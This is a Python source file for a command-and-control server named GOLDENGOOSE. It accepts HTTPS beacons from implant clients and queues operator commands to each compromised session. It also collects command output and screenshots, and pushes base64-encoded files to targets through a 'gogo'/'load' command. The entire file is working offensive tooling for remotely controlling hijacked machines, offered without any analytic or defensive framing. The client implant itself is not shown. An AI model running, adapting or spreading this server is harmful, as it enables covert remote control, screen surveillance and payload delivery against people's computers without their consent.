import json
import ssl
import threading
import queue
import logging
import zlib
import base64
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
import tempfile

# Timeout for when a client is considered disconnected
SESSION_TIMEOUT = 60

# Globals to keep track of sessions and session data
sessions          = {'0':0}             # Currently seen clients
session_last_seen = {'0':0}             # Last seen timestamp of a client
session_queues    = {'0':queue.Queue()} # Queued commands for the client
session_commands  = {'0':[]}            # Available commands that the client can run
selected_session = '0'                  # The session to interact with

# The port for GOLDENGOOSE clients to connect to
C2_LISTEN_ADDR = "127.0.0.1"
C2_LISTEN_PORT = 443

def bmp(data):
    try:
        d = json.loads(data)
        with tempfile.NamedTemporaryFile(mode="wb", delete=False, suffix=".bmp") as f:
            f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))
        return f.name
    except Exception as e:
        return f"Error saving screenshot: {e}"

def clean_sessions_thread():
    global sessions
    global session_last_seen
    global session_queues

    while True:
        for session in session_last_seen:
            if session == '0':
                continue
            # Remove the session if it exceeds timeout
            if (time.time() - session_last_seen[session]) > SESSION_TIMEOUT:
                print("Session [{}] has timed out...".format(session))
                _ = sessions.pop(session)
                _ = session_last_seen.pop(session)
                _ = session_queues.pop(session)
                break
        time.sleep(30)

class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override to log to a file instead of stdout
        logging.info("%s - - [%s] %s\n" %
                     (self.client_address[0],
                      self.log_date_time_string(),
                      format % args))
    def do_POST(self):
        global sessions
        global session_queues
        global session_commands
        
        clientid = self.headers.get("clientid")
        commands = self.headers.get("Commands")
        command = self.headers.get("command")
        
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        received = post_data
        response = b""
        # Got back a response from a command
        if (received != b"none"):
            print("[ {} ]".format(command))
            if command.startswith("screenshot"):
                print(f"Screenshot saved: {bmp(received)}")
            else:
                for line in str(received)[2:-1].split("\\n"):
                    print(line)

        if clientid:
            session_last_seen[clientid] = time.time()
            if clientid not in sessions:
                print("\n[+] Adding clientid: {}".format(clientid))
                sessions[clientid] = 0
                session_queues[clientid] = queue.Queue()
                session_commands[clientid] = commands.split() if commands else []
           
            sessions[clientid] += 1
            session_commands[clientid] = commands.split() if commands else []
            if not session_queues[clientid].empty():
                response = session_queues[clientid].get()
                print("sending command:", response[:256])
                if not isinstance(response, bytes):
                    response = response.encode()
        else:
            print("client missing")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)


def run_server(server_class=HTTPServer, handler_class=CustomHTTPRequestHandler, port=C2_LISTEN_PORT):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    
    # Load SSL context
    #httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="key.pem", certfile='cert.pem', server_side=True)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("cert.pem",keyfile="key.pem")
    httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)
    
    print(f'Serving HTTPS on port {port}...')
    httpd.serve_forever()

def user_interface():
    global selected_session
    global session_commands
    global session_queues
    
    while True:
        display_block  = "[ === ===  GOLDENGOOSE  === === ]\n"
        if selected_session != '0':
            display_block += "[  bg|background, unq, " + ', '.join(session_commands[selected_session]) + "\n"
            display_block += "[ Queued for target:\n"
            with session_queues[selected_session].mutex:
                for i,item in enumerate(list(session_queues[selected_session].queue)):
                    display_block += f"[  <{i}> {item}\n"
        else:
            display_block += "[ Available sessions:\n"
            for i in range(0, len(sessions.keys()), 3):
                display_block += "[    " + ' '.join(list(sessions.keys())[i:i+3]) + "\n"
            display_block += "[ Commands:\n"
            display_block += "[  select <clientid>\n"
            display_block += "[  exit\n"

        display_block += "[{}]> ".format(selected_session if selected_session != '0' else "no session")
        command = input(display_block)

        # builtin commands            
        if command in ['bg', 'background']:
            selected_session = '0'
        elif command.startswith('unq'):
            with session_queues[selected_session].mutex:
                _ = session_queues[selected_session].get()
        elif command.startswith('select'):
            clientid = command.split(' ')[1]
            if clientid in sessions:
                selected_session = clientid
            else:
                print(f'[!] Session {clientid} does not exist.')
        elif command == 'exit':
            return
        # invalid commands
        elif len(command.strip()) < 2:
            pass
        # Valid command to send to target
        elif command.split()[0].strip() in session_commands[selected_session] + ["load"]:
            if command.startswith("gogo") or command.startswith("load"):
                try:
                    file = command.split()[-1]
                    with open(file, "rb") as f:
                        data = f.read()
                    command = "gogo " + base64.b64encode(data).decode()
                except Exception as e:
                    print(f"Error with command: {e}")
                    continue
            session_queues[selected_session].put(command)
            print(f'Queued data for session {selected_session}.')


if __name__ == "__main__":
    print("""               __    __                                   
  ___ _ ___   / /___/ /___  ___  ___ _ ___  ___   ___ ___ 
 / _ `// _ \ / // _  // -_)/ _ \/ _ `// _ \/ _ \ (_-</ -_)
 \_, / \___//_/ \_,_/ \__//_//_/\_, / \___/\___//___/\__/ 
/___/                          /___/                      """)
    
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    cleaner = threading.Thread(target=clean_sessions_thread)
    cleaner.daemon = True
    cleaner.start()
    
    time.sleep(1) # Let the server startup before presenting interface
    user_interface()